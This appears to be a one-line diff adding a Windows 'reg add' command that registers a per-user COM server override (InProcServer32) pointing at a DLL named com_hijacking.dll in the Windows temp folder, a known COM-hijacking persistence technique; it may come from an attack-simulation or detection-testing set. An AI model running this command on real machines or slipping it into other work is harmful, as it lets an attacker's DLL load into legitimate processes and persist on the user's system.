@@ -1,0 +1,1 @@
+reg add HKCU\Software\Classes\CLSID\{4234d49b-0245-4df3-b780-3893943456e1}\InProcServer32 /f /t REG_EXPAND_SZ /d "%WINDIR%\Temp\com_hijacking.dll"
